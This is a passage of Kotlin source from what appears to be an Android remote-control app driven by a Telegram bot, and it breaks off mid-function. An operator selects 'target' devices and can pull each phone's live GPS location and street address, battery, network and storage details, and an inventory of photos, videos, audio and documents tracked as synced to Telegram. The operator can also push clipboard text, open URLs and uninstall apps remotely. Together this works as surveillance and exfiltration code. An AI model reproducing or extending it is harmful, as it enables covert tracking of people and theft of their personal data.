        // 1. All-device broadcast discovery or target selection commands:
        if (rawCommand in listOf(
                "/devices", "/ping", "/list_devices", "/alldevices", "/devicelist",
                "/all_devices", "/online", "/who", "/clients", "/select", "/target", "/use", "/device"
            )) {
            return true
        }

        val target = targetArg?.trim()?.lowercase()

        // 2. If target is explicitly specified:
        if (!target.isNullOrBlank()) {
            if (target == "all" || target == "*") {
                return true
            }

            // If target starts with http/www or is a URL or is purely digits (e.g. duration, PIN, count),
            // it's a command payload/argument rather than a device ID filter.
            val isPayload = target.startsWith("http://") || target.startsWith("https://") ||
                    target.startsWith("www.") || target.contains("/") || target.all { it.isDigit() }

            if (!isPayload) {
                return matchesDeviceTarget(target, myDeviceId)
            }
        }

        // 3. For /help, /start, /menu without explicit target:
        if (rawCommand in listOf("/help", "/start", "/menu")) {
            val selectedTarget = repository.getSelectedTargetDevice()
            if (!selectedTarget.isNullOrBlank() && !selectedTarget.equals("all", ignoreCase = true)) {
                return matchesDeviceTarget(selectedTarget, myDeviceId)
            }
            return true
        }

        // 4. For general commands without explicit target (e.g. /photo_front, /location, /status, or button click):
        val selectedTarget = repository.getSelectedTargetDevice()
        if (!selectedTarget.isNullOrBlank()) {
            if (selectedTarget.equals("all", ignoreCase = true) || selectedTarget == "*") {
                return true
            }
            // Strict routing: Only the active target device executes this general command!
            return matchesDeviceTarget(selectedTarget, myDeviceId)
        }

        // 5. Default: If no active target device was selected yet, this device executes
        return true
    }

    private suspend fun handleSelectDeviceCommand(
        targetArg: String?,
        botToken: String,
        chatId: String,
        deviceId: String
    ) {
        val cleanTarget = targetArg?.trim()?.lowercase()
        val currentSelected = repository.getSelectedTargetDevice()

        if (cleanTarget.isNullOrBlank()) {
            val statusMsg = "🎯 <b>TARGET DEVICE SELECTION</b>\n\n" +
                    "📱 <b>This Device:</b> <code>$deviceId</code> (${escapeHtml(Build.MANUFACTURER.uppercase())} ${escapeHtml(Build.MODEL)})\n" +
                    "🎯 <b>Currently Active:</b> <code>${currentSelected ?: "All Devices (Default)"}</code>\n\n" +
                    "💡 <b>কীভাবে নির্দিষ্ট ডিভাইস সিলেক্ট করবেন:</b>\n" +
                    "• শুধুমাত্র এই ডিভাইসকে কমান্ড দিতে: <code>/select $deviceId</code>\n" +
                    "• সব ডিভাইসে একসাথে কমান্ড দিতে: <code>/select all</code>\n" +
                    "• সব অনলাইন ডিভাইস দেখতে: <code>/devices</code>"

            val buttons = """
{
  "inline_keyboard": [
    [
      {"text": "🎯 Select THIS Device", "callback_data": "/select $deviceId"},
      {"text": "🌐 Select ALL Devices", "callback_data": "/select all"}
    ],
    [
      {"text": "📱 View All Devices", "callback_data": "/devices"},
      {"text": "📋 Dashboard", "callback_data": "/help $deviceId"}
    ]
  ]
}
""".trimIndent()
            telegramApi.sendMessage(botToken, chatId, statusMsg, replyMarkupJson = buttons)
            return
        }

        if (cleanTarget == "all" || cleanTarget == "*") {
            repository.setSelectedTargetDevice("all")
            val allMsg = "🌐 <b>TARGET SET TO ALL DEVICES</b>\n\n" +
                    "✅ এখন থেকে সাধারণ কমান্ড দিলে সব কানেক্টেড ডিভাইস একসাথে রেসপন্স করবে।\n" +
                    "💡 নির্দিষ্ট একটি ডিভাইস সিলেক্ট করতে <code>/select [Device_ID]</code> লিখুন অথবা <code>/devices</code> থেকে বাটনে চাপুন।"
            telegramApi.sendMessage(botToken, chatId, allMsg)
            return
        }

        val matchesThis = matchesDeviceTarget(cleanTarget, deviceId)
        if (matchesThis) {
            repository.setSelectedTargetDevice(deviceId)
            val selectedMsg = "🎯 <b>TARGET DEVICE SELECTED: <code>$deviceId</code></b>\n\n" +
                    "📱 <b>Model:</b> ${escapeHtml(Build.MANUFACTURER.uppercase())} ${escapeHtml(Build.MODEL)}\n" +
                    "⚡ <b>Status:</b> Active Target Set!\n\n" +
                    "✅ এখন থেকে সাধারণ সকল কমান্ড (যেমন: <code>/photo_front</code>, <code>/location</code>, <code>/status</code>, <code>/help</code> ইত্যাদি) এবং নিচের অ্যাকশন বাটনে ক্লিক করলে <b>শুধুমাত্র এই ডিভাইসেই</b> কার্যকর হবে। অন্য ডিভাইসে যাবে না!\n\n" +
                    "💡 ডিভাইস পরিবর্তন করতে: <code>/devices</code> বা <code>/select [Other_ID]</code>\n" +
                    "💡 সব ডিভাইসে যেতে: <code>/select all</code>"

            telegramApi.sendMessage(botToken, chatId, selectedMsg, replyMarkupJson = getInlineKeyboardJson(deviceId))
        } else {
            // Save the selection on this device as well so it knows it is standby
            repository.setSelectedTargetDevice(cleanTarget)
        }
    }

    private fun extractPayload(fullText: String, commandWord: String, targetArg: String?, deviceId: String): String {
        val firstToken = fullText.trim().split("\\s+".toRegex()).firstOrNull() ?: ""
        val afterCmd = if (firstToken.isNotBlank()) {
            fullText.trim().removePrefix(firstToken).trim()
        } else {
            fullText.substringAfter(commandWord).trim()
        }
        if (targetArg == null) return afterCmd

        val isTargetArgDeviceId = targetArg.equals("all", ignoreCase = true) ||
                deviceId.lowercase().contains(targetArg.lowercase()) ||
                Build.MODEL.lowercase().contains(targetArg.lowercase()) ||
                Build.BRAND.lowercase().contains(targetArg.lowercase()) ||
                Build.MANUFACTURER.lowercase().contains(targetArg.lowercase())

        return if (isTargetArgDeviceId) {
            afterCmd.substringAfter(targetArg).trim()
        } else {
            afterCmd
        }
    }

    private fun extractAppsQuery(fullText: String, commandWord: String, deviceId: String): String? {
        val afterCmd = fullText.substringAfter(commandWord).trim()
        if (afterCmd.isBlank()) return null

        val tokens = afterCmd.split("\\s+".toRegex()).filter { it.isNotBlank() }
        val nonDeviceTokens = tokens.filter { token ->
            !token.equals(deviceId, ignoreCase = true) &&
            !deviceId.lowercase().contains(token.lowercase()) &&
            !token.equals("all", ignoreCase = true)
        }

        return if (nonDeviceTokens.isNotEmpty()) nonDeviceTokens.joinToString(" ") else null
    }

    private fun extractTargetQuery(fullText: String, commandWord: String, deviceId: String): String {
        val afterCmd = fullText.substringAfter(commandWord).trim()
        if (afterCmd.isBlank()) return ""

        val tokens = afterCmd.split("\\s+".toRegex()).filter { it.isNotBlank() }
        val nonDeviceTokens = tokens.filter { token ->
            !token.equals(deviceId, ignoreCase = true) &&
            !deviceId.lowercase().contains(token.lowercase()) &&
            !token.equals("all", ignoreCase = true) &&
            !Build.MODEL.split("\\s+".toRegex()).any { m -> m.equals(token, ignoreCase = true) } &&
            !Build.MANUFACTURER.split("\\s+".toRegex()).any { m -> m.equals(token, ignoreCase = true) }
        }

        return nonDeviceTokens.joinToString(" ").trim()
    }

    @SuppressLint("MissingPermission")
    private suspend fun sendDeviceLocation(botToken: String, chatId: String, deviceId: String) {
        val hasFine = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager

        if (locationManager == null) {
            telegramApi.sendMessage(botToken, chatId, "⚠️ Location Service is unavailable on <code>$deviceId</code>")
            return
        }

        // Try getting last known location first (GPS then Network then Passive)
        var bestLocation: Location? = null
        if (hasFine || hasCoarse) {
            try {
                val gpsLoc = if (hasFine) locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) else null
                val netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                val passLoc = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

                bestLocation = listOfNotNull(gpsLoc, netLoc, passLoc).maxByOrNull { it.time }
            } catch (_: Exception) {}
        }

        if (bestLocation != null) {
            dispatchLocationResult(bestLocation, botToken, chatId, deviceId, isLiveFresh = false)
            return
        }

        // If no cached location, request a fresh location update on main thread with timeout
        if (hasFine || hasCoarse) {
            Handler(Looper.getMainLooper()).post {
                try {
                    val singleListener = object : LocationListener {
                        override fun onLocationChanged(location: Location) {
                            try {
                                locationManager.removeUpdates(this)
                            } catch (_: Exception) {}
                            scope.launch(Dispatchers.IO) {
                                dispatchLocationResult(location, botToken, chatId, deviceId, isLiveFresh = true)
                            }
                        }
                        @Deprecated("Deprecated in Java")
                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                        override fun onProviderEnabled(provider: String) {}
                        override fun onProviderDisabled(provider: String) {}
                    }

                    val provider = if (hasFine && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                        LocationManager.GPS_PROVIDER
                    } else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                        LocationManager.NETWORK_PROVIDER
                    } else {
                        LocationManager.PASSIVE_PROVIDER
                    }

                    locationManager.requestSingleUpdate(provider, singleListener, Looper.getMainLooper())

                    // Timeout fallback
                    scope.launch {
                        delay(9000)
                        withContext(Dispatchers.Main) {
                            try {
                                locationManager.removeUpdates(singleListener)
                            } catch (_: Exception) {}
                        }
                    }
                } catch (e: Exception) {
                    scope.launch(Dispatchers.IO) {
                        sendIpGeoLocationFallback(botToken, chatId, deviceId, "GPS fix timed out (${e.message ?: "No Satellite Fix"})")
                    }
                }
            }
        } else {
            sendIpGeoLocationFallback(botToken, chatId, deviceId, "Device Location permission not yet granted in Settings")
        }
    }

    private suspend fun dispatchLocationResult(
        location: Location,
        botToken: String,
        chatId: String,
        deviceId: String,
        isLiveFresh: Boolean
    ) {
        val lat = location.latitude
        val lon = location.longitude
        val accuracy = if (location.hasAccuracy()) "${location.accuracy.toInt()}m" else "Approx"
        val speed = if (location.hasSpeed()) String.format(Locale.US, "%.1f km/h", location.speed * 3.6) else "Stationary"
        val altitude = if (location.hasAltitude()) "${location.altitude.toInt()}m" else "N/A"

        // Reverse Geocoding for human address
        var addressText = "Unknown Area"
        try {
            val geocoder = Geocoder(context, Locale.getDefault())
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lon, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses[0]
                val street = addr.getAddressLine(0) ?: ""
                val locality = addr.locality ?: addr.subAdminArea ?: ""
                val country = addr.countryName ?: ""
                addressText = if (street.isNotBlank()) street else "$locality, $country"
            }
        } catch (_: Exception) {}

        val mapUrl = "https://maps.google.com/?q=$lat,$lon"

        val msg = "📍 <b>DEVICE LIVE LOCATION [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Model:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                "🏠 <b>Address:</b> $addressText\n" +
                "🌐 <b>Coordinates:</b> <code>$lat, $lon</code>\n" +
                "🎯 <b>Accuracy:</b> $accuracy (${if (isLiveFresh) "⚡ Real-time GPS Fix" else "🕒 Recent Location"})\n" +
                "🚀 <b>Movement Speed:</b> $speed | <b>Altitude:</b> $altitude\n" +
                "🗺️ <b>Google Maps:</b> <a href=\"$mapUrl\">Open in Google Maps</a>\n" +
                "🕒 <b>Recorded At:</b> ${getCurrentTimeString()}"

        // Send detailed text card with Google Maps link
        telegramApi.sendMessage(botToken, chatId, msg)

        // Send native interactive pin location card to Telegram
        telegramApi.sendLocation(botToken, chatId, lat, lon)
    }

    private suspend fun sendIpGeoLocationFallback(
        botToken: String,
        chatId: String,
        deviceId: String,
        reason: String
    ) {
        val netType = getActiveNetworkType()
        val msg = "📍 <b>LOCATION STATUS [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                "🌐 <b>Network Connected:</b> $netType\n" +
                "⚠️ <b>Note:</b> $reason\n" +
                "💡 <i>Make sure GPS / Location toggle is enabled on device or grant Location permission for precise street coordinates.</i>"

        telegramApi.sendMessage(botToken, chatId, msg)
    }

    private suspend fun sendBatteryReport(botToken: String, chatId: String, deviceId: String) {
        val batteryPct = getBatteryPercentage()
        val isCharging = isDeviceCharging()
        val batteryIntent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val temp = ((batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0)
        val voltage = ((batteryIntent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0) / 1000.0)
        val tech = batteryIntent?.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY) ?: "Li-ion"

        val statusText = if (isCharging) "⚡ Charging (AC/USB)" else "🪫 Discharging on Battery"

        val msg = "🔋 <b>BATTERY HEALTH & POWER [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                "📊 <b>Level:</b> $batteryPct%\n" +
                "🔌 <b>Status:</b> $statusText\n" +
                "🌡️ <b>Temperature:</b> ${String.format(Locale.US, "%.1f", temp)} °C\n" +
                "⚡ <b>Voltage:</b> ${String.format(Locale.US, "%.2f", voltage)} V\n" +
                "🧪 <b>Battery Tech:</b> $tech\n" +
                "🕒 <b>Checked At:</b> ${getCurrentTimeString()}"

        telegramApi.sendMessage(botToken, chatId, msg)
    }

    private suspend fun sendNetworkReport(botToken: String, chatId: String, deviceId: String) {
        val netType = getActiveNetworkType()
        val wifiDetail = getDetailedWifiInfo()

        val msg = "🌐 <b>NETWORK & CONNECTIVITY [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                "📶 <b>Active Interface:</b> $netType\n" +
                "📡 <b>Connection Info:</b> $wifiDetail\n" +
                "🌍 <b>Timezone:</b> ${java.util.TimeZone.getDefault().id}\n" +
                "🕒 <b>Checked At:</b> ${getCurrentTimeString()}"

        telegramApi.sendMessage(botToken, chatId, msg)
    }

    private suspend fun sendStorageReport(botToken: String, chatId: String, deviceId: String) {
        val storage = getStorageStats()
        val allMedia = mediaScanner.scanAllMedia()
        val uploadedIds = repository.getUploadedIds()
        val pending = allMedia.count { !uploadedIds.contains(it.id) }

        val msg = "💾 <b>STORAGE CAPACITY & BACKUP [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                "📂 <b>Internal Disk:</b> ${storage.freeGb} GB Free / ${storage.totalGb} GB (${storage.usedPercent}% used)\n" +
                "🖼️ <b>Total Media Files Found:</b> ${allMedia.size} items\n" +
                "☁️ <b>Synced to Telegram:</b> ${uploadedIds.size} files\n" +
                "⏳ <b>Pending Sync:</b> $pending files\n" +
                "🕒 <b>Checked At:</b> ${getCurrentTimeString()}"

        telegramApi.sendMessage(botToken, chatId, msg)
    }

    private suspend fun sendMediaStatsReport(botToken: String, chatId: String, deviceId: String) {
        try {
            val allMedia = mediaScanner.scanAllMedia()
            val uploadedIds = repository.getUploadedIds()

            val photos = allMedia.filter { it.mediaType == MediaType.PHOTO }
            val screenshots = allMedia.filter { it.mediaType == MediaType.SCREENSHOT }
            val videos = allMedia.filter { it.mediaType == MediaType.VIDEO }
            val audios = allMedia.filter { it.mediaType == MediaType.AUDIO }
            val docs = allMedia.filter { it.mediaType == MediaType.DOCUMENT }

            val photoSizeMb = photos.sumOf { it.size } / (1024.0 * 1024.0)
            val ssSizeMb = screenshots.sumOf { it.size } / (1024.0 * 1024.0)
            val vidSizeMb = videos.sumOf { it.size } / (1024.0 * 1024.0)
            val audioSizeMb = audios.sumOf { it.size } / (1024.0 * 1024.0)
            val docSizeMb = docs.sumOf { it.size } / (1024.0 * 1024.0)

            val totalSizeBytes = allMedia.sumOf { it.size }
            val totalSizeMb = totalSizeBytes / (1024.0 * 1024.0)
            val totalSizeGb = totalSizeBytes / (1024.0 * 1024.0 * 1024.0)

            val photoSynced = photos.count { uploadedIds.contains(it.id) }
            val ssSynced = screenshots.count { uploadedIds.contains(it.id) }
            val vidSynced = videos.count { uploadedIds.contains(it.id) }
            val audioSynced = audios.count { uploadedIds.contains(it.id) }
            val docSynced = docs.count { uploadedIds.contains(it.id) }

            val totalSynced = uploadedIds.size
            val totalPending = (allMedia.size - totalSynced).coerceAtLeast(0)

            val msg = "📊 <b>DETAILED MEDIA & STORAGE STATS [ID: <code>$deviceId</code>]</b>\n\n" +
                    "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n\n" +
                    "🖼️ <b>Photos & Images:</b>\n" +
                    "  • Total: ${photos.size} files (${String.format(Locale.US, "%.1f", photoSizeMb)} MB)\n" +
                    "  • Synced: $photoSynced | Pending: ${photos.size - photoSynced}\n\n" +
                    "📸 <b>Screenshots:</b>\n" +
                    "  • Total: ${screenshots.size} files (${String.format(Locale.US, "%.1f", ssSizeMb)} MB)\n" +
                    "  • Synced: $ssSynced | Pending: ${screenshots.size - ssSynced}\n\n" +
                    "🎥 <b>Videos:</b>\n" +
                    "  • Total: ${videos.size} files (${String.format(Locale.US, "%.1f", vidSizeMb)} MB)\n" +
                    "  • Synced: $vidSynced | Pending: ${videos.size - vidSynced}\n\n" +
                    "🎵 <b>Audio & Voice Notes:</b>\n" +
                    "  • Total: ${audios.size} files (${String.format(Locale.US, "%.1f", audioSizeMb)} MB)\n" +
                    "  • Synced: $audioSynced | Pending: ${audios.size - audioSynced}\n\n" +
                    "📄 <b>Documents & Downloads:</b>\n" +
                    "  • Total: ${docs.size} files (${String.format(Locale.US, "%.1f", docSizeMb)} MB)\n" +
                    "  • Synced: $docSynced | Pending: ${docs.size - docSynced}\n\n" +
                    "━━━━━━━━━━━━━━━━━━━━\n" +
                    "💾 <b>GRAND TOTAL:</b> ${allMedia.size} items (${String.format(Locale.US, "%.1f", totalSizeMb)} MB / ${String.format(Locale.US, "%.2f", totalSizeGb)} GB)\n" +
                    "☁️ <b>Cloud Status:</b> $totalSynced Synced | $totalPending Pending\n" +
                    "🕒 <b>Calculated:</b> ${getCurrentTimeString()}"

            telegramApi.sendMessage(botToken, chatId, msg)
        } catch (e: Exception) {
            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to calculate media stats on $deviceId: ${e.message}")
        }
    }

    private fun pushToClipboard(text: String, botToken: String, chatId: String, deviceId: String) {
        if (text.isBlank()) {
            scope.launch(Dispatchers.IO) {
                telegramApi.sendMessage(botToken, chatId, "⚠️ <b>Usage:</b> <code>/setclip [text]</code> or <code>/setclip $deviceId [text]</code>")
            }
            return
        }
        Handler(Looper.getMainLooper()).post {
            try {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
                val clip = ClipData.newPlainText("Telegram Remote Clip", text)
                clipboard?.setPrimaryClip(clip)

                scope.launch(Dispatchers.IO) {
                    val msg = "📋 <b>REMOTE CLIPBOARD PUSHED [ID: <code>$deviceId</code>]</b>\n\n" +
                            "✅ <b>Copied to device clipboard:</b>\n<code>${text.take(3000)}</code>\n\n" +
                            "📱 Device: ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                            "🕒 Time: ${getCurrentTimeString()}"
                    telegramApi.sendMessage(botToken, chatId, msg)
                }
            } catch (e: Exception) {
                scope.launch(Dispatchers.IO) {
                    telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to set clipboard on $deviceId: ${e.message}")
                }
            }
        }
    }

    private fun isDirectUrlString(str: String): Boolean {
        val t = str.trim()
        if (t.startsWith("http://", ignoreCase = true) || t.startsWith("https://", ignoreCase = true)) {
            return true
        }
        if (t.startsWith("www.", ignoreCase = true)) {
            return true
        }
        // Check for common domains if single word like "google.com" or "youtu.be/xyz"
        val firstToken = t.split("\\s+".toRegex())[0].lowercase()
        if (firstToken.contains(".") && !firstToken.startsWith("/") && !firstToken.startsWith("@")) {
            val validTlds = listOf(".com", ".org", ".net", ".io", ".me", ".tv", ".co", ".app", ".dev", ".ai", ".xyz", ".info", ".edu", ".gov", ".bd", ".in", ".uk", ".gg", ".to")
            if (validTlds.any { firstToken.endsWith(it) || firstToken.contains("$it/") || firstToken.contains("$it?") }) {
                return true
            }
        }
        return false
    }

    private fun extractUrlFromText(text: String): String {
        val trimmed = text.trim()
        val tokens = trimmed.split("\\s+".toRegex())
        for (token in tokens) {
            val clean = token.removePrefix("<").removeSuffix(">").removePrefix("(").removeSuffix(")")
            if (clean.startsWith("http://", ignoreCase = true) ||
                clean.startsWith("https://", ignoreCase = true) ||
                clean.startsWith("www.", ignoreCase = true) ||
                clean.contains(".com") || clean.contains(".org") || clean.contains(".net") ||
                clean.contains(".io") || clean.contains(".app") || clean.contains(".dev") ||
                clean.contains(".ai") || clean.contains(".co") || clean.contains(".xyz")
            ) {
                return clean
            }
        }
        return trimmed
    }

    private fun openUrlInBrowser(rawUrl: String, botToken: String, chatId: String, deviceId: String) {
        val extracted = extractUrlFromText(rawUrl)
        if (extracted.isBlank()) {
            scope.launch(Dispatchers.IO) {
                telegramApi.sendMessage(botToken, chatId, "⚠️ <b>Usage:</b> Send direct link (e.g. <code>https://google.com</code>) or <code>/open [url]</code>")
            }
            return
        }
        val formattedUrl = if (!extracted.startsWith("http://", ignoreCase = true) && !extracted.startsWith("https://", ignoreCase = true)) {
            "https://$extracted"
        } else {
            extracted
        }

        Handler(Looper.getMainLooper()).post {
            try {
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(formattedUrl)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)

                scope.launch(Dispatchers.IO) {
                    val msg = "🌐 <b>URL OPENED ON PHONE [ID: <code>$deviceId</code>]</b>\n\n" +
                            "🔗 <b>Opened URL:</b> <a href=\"$formattedUrl\">$formattedUrl</a>\n" +
                            "📱 Device: ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                            "🕒 Time: ${getCurrentTimeString()}"
                    telegramApi.sendMessage(botToken, chatId, msg)
                }
            } catch (e: Exception) {
                scope.launch(Dispatchers.IO) {
                    telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to open URL on $deviceId: ${e.message}")
                }
            }
        }
    }

    private suspend fun handleAppsListCommand(queryOrPage: String?, botToken: String, chatId: String, deviceId: String) = withContext(Dispatchers.IO) {
        try {
            val pm = context.packageManager
            val allPackages = pm.getInstalledPackages(0)

            val userApps = mutableListOf<PackageInfo>()
            val systemApps = mutableListOf<PackageInfo>()

            for (pkg in allPackages) {
                val isSystem = (pkg.applicationInfo?.flags ?: 0) and ApplicationInfo.FLAG_SYSTEM != 0
                if (isSystem) {
                    systemApps.add(pkg)
                } else {
                    userApps.add(pkg)
                }
            }

            userApps.sortBy { pkg ->
                pkg.applicationInfo?.loadLabel(pm)?.toString()?.lowercase() ?: pkg.packageName.lowercase()
            }

            val trimmedQuery = queryOrPage?.trim() ?: ""
            val isNumericPage = trimmedQuery.toIntOrNull() != null
            val isSystemFilter = trimmedQuery.equals("system", ignoreCase = true)
            val isSearchQuery = trimmedQuery.isNotBlank() && !isNumericPage && !isSystemFilter && !trimmedQuery.equals("all", ignoreCase = true)

            if (isSearchQuery) {
                val q = trimmedQuery.lowercase()
                val matches = allPackages.filter { pkg ->
                    val label = pkg.applicationInfo?.loadLabel(pm)?.toString()?.lowercase() ?: ""
                    label.contains(q) || pkg.packageName.lowercase().contains(q)
                }

                if (matches.isEmpty()) {
                    val msg = "🔍 <b>NO APP FOUND [ID: <code>$deviceId</code>]</b>\n\n" +
                            "ফোনে '<b>$trimmedQuery</b>' নামে কোনো অ্যাপ পাওয়া যায়নি।\n\n" +
                            "💡 <i>ইনস্টল করা সব অ্যাপ দেখতে <code>/apps</code> পাঠান অথবা ইনস্টল করতে <code>/install $trimmedQuery</code> ব্যবহার করুন।</i>"
                    telegramApi.sendMessage(botToken, chatId, msg)
                    return@withContext
                }

                val sb = StringBuilder()
                sb.append("🔍 <b>MATCHING APPS (${matches.size}) [ID: <code>$deviceId</code>]</b>\n")
                sb.append("খোঁজা হয়েছে: <i>$trimmedQuery</i>\n━━━━━━━━━━━━━━━━━━━━\n\n")

                matches.take(15).forEachIndexed { index, pkg ->
                    val label = pkg.applicationInfo?.loadLabel(pm)?.toString() ?: pkg.packageName
                    val isSys = (pkg.applicationInfo?.flags ?: 0) and ApplicationInfo.FLAG_SYSTEM != 0
                    val sysTag = if (isSys) " 🛡️[System]" else ""
                    val version = pkg.versionName ?: "1.0"

                    sb.append("<b>${index + 1}. $label</b>$sysTag (v$version)\n")
                    sb.append("• 📦 <code>${pkg.packageName}</code>\n")
                    if (!isSys) {
                        sb.append("• 🗑️ /uninstall ${pkg.packageName}\n")
                    }
                    sb.append("• 🚀 /openapp ${pkg.packageName}\n\n")
                }

                sb.append("━━━━━━━━━━━━━━━━━━━━\n")
                sb.append("💡 <i>যেকোনো নীল কমান্ডে ক্লিক করে সাথে সাথে অ্যাকশন নিতে পারেন।</i>")
                telegramApi.sendMessage(botToken, chatId, sb.toString())
                return@withContext
            }

            val targetList = if (isSystemFilter) systemApps else userApps
            val listTitle = if (isSystemFilter) "SYSTEM APPS" else "USER APPS"
            val pageSize = 8
            val totalApps = targetList.size
            val totalPages = ((totalApps + pageSize - 1) / pageSize).coerceAtLeast(1)

            val page = when {
                isNumericPage -> (trimmedQuery.toInt()).coerceIn(1, totalPages)
                else -> 1
            }

            val startIndex = (page - 1) * pageSize
            val endIndex = (startIndex + pageSize).coerceAtMost(totalApps)
            val pageItems = if (startIndex < totalApps) targetList.subList(startIndex, endIndex) else emptyList()

            val sb = StringBuilder()
            sb.append("📦 <b>$listTitle (Page $page of $totalPages) [ID: <code>$deviceId</code>]</b>\n")
            sb.append("📱 <b>User Apps:</b> ${userApps.size} টি | <b>System:</b> ${systemApps.size} টি\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            if (pageItems.isEmpty()) {
                sb.append("No apps found in this category.\n")
            } else {
                pageItems.forEachIndexed { idx, pkg ->
                    val number = startIndex + idx + 1
                    val label = pkg.applicationInfo?.loadLabel(pm)?.toString() ?: pkg.packageName
                    val version = pkg.versionName ?: "1.0"

                    sb.append("<b>$number. $label</b> (v$version)\n")
                    sb.append("• 📦 <code>${pkg.packageName}</code>\n")
                    sb.append("• 🗑️ /uninstall ${pkg.packageName}\n")
                    sb.append("• 🚀 /openapp ${pkg.packageName}\n\n")
                }
            }

            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            if (totalPages > 1) {
                val nextP = if (page < totalPages) page + 1 else 1
                sb.append("📖 <i>পরবর্তী পেজ: <code>/apps $nextP</code> (মোট $totalPages টি পেজ)</i>\n")
            }
            sb.append("🔍 <i>সার্চ করতে: <code>/apps [নাম]</code> (যেমন: <code>/apps whatsapp</code>)</i>\n")
            sb.append("📲 <i>নতুন অ্যাপ ইনস্টল করতে: <code>/install [নাম/লিংক]</code></i>")

            val prevPage = if (page > 1) page - 1 else totalPages
            val nextPage = if (page < totalPages) page + 1 else 1

            val inlineMarkup = """
{
  "inline_keyboard": [
    [
      {"text": "◀️ Prev ($prevPage)", "callback_data": "/apps $prevPage $deviceId"},
      {"text": "Next ($nextPage) ▶️", "callback_data": "/apps $nextPage $deviceId"}
    ],
    [
      {"text": "📦 User Apps (P1)", "callback_data": "/apps 1 $deviceId"},
      {"text": "📱 Status", "callback_data": "/status $deviceId"}
    ],
    [
      {"text": "📋 All Commands", "callback_data": "/help $deviceId"}
    ]
  ]
}
""".trimIndent()

            telegramApi.sendMessage(botToken, chatId, sb.toString(), replyMarkupJson = inlineMarkup)

        } catch (e: Exception) {
            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to list apps on $deviceId: ${e.message}")
        }
    }

    private fun handleUninstallCommand(rawQuery: String, botToken: String, chatId: String, deviceId: String) {
        val query = rawQuery.trim()
        if (query.isBlank()) {
            scope.launch(Dispatchers.IO) {
                val usage = "🗑️ <b>UNINSTALL APP USAGE:</b>\n\n" +
                        "<code>/uninstall [package_name or app_name]</code>\n\n" +
                        "<b>উদাহরণ:</b>\n" +
                        "• <code>/uninstall com.whatsapp</code>\n" +
                        "• <code>/uninstall telegram</code>\n" +
                        "• <code>/uninstall pubg</code>\n\n" +
                        "💡 <i>ইনস্টল করা অ্যাপের তালিকা দেখতে <code>/apps</code> পাঠান।</i>"
                telegramApi.sendMessage(botToken, chatId, usage)
            }
            return
        }

        scope.launch(Dispatchers.IO) {
            try {
                val pm = context.packageManager
                val allInstalled = pm.getInstalledPackages(0)

                // 1. Direct package match
                var matchedPkg = allInstalled.find { it.packageName.equals(query, ignoreCase = true) }

                // 2. Search by app label if not found
                if (matchedPkg == null) {
                    val labelMatches = allInstalled.filter { pkg ->
                        val label = pkg.applicationInfo?.loadLabel(pm)?.toString() ?: ""
                        label.contains(query, ignoreCase = true)
                    }

                    if (labelMatches.size == 1) {
                        matchedPkg = labelMatches[0]
                    } else if (labelMatches.size > 1) {
                        val sb = StringBuilder()
                        sb.append("⚠️ <b>একাধিক অ্যাপ পাওয়া গেছে [ID: <code>$deviceId</code>]</b>\n")
                        sb.append("কোন অ্যাপটি আনইনস্টল করতে চান বেছে নিন:\n━━━━━━━━━━━━━━━━━━━━\n\n")
                        labelMatches.take(8).forEach { pkg ->
                            val label = pkg.applicationInfo?.loadLabel(pm)?.toString() ?: pkg.packageName
                            sb.append("• <b>$label</b>\n  <code>/uninstall ${pkg.packageName}</code>\n\n")
                        }
                        telegramApi.sendMessage(botToken, chatId, sb.toString())
                        return@launch
                    }
                }

                if (matchedPkg == null) {
                    telegramApi.sendMessage(
                        botToken,
                        chatId,
                        "❌ <b>APP NOT FOUND [ID: <code>$deviceId</code>]</b>\n\n'<b>$query</b>' নামে কোনো অ্যাপ এই ফোনে পাওয়া যায়নি। সঠিক তালিকা দেখতে <code>/apps</code> পাঠান।"
                    )
                    return@launch
                }

                val packageName = matchedPkg.packageName
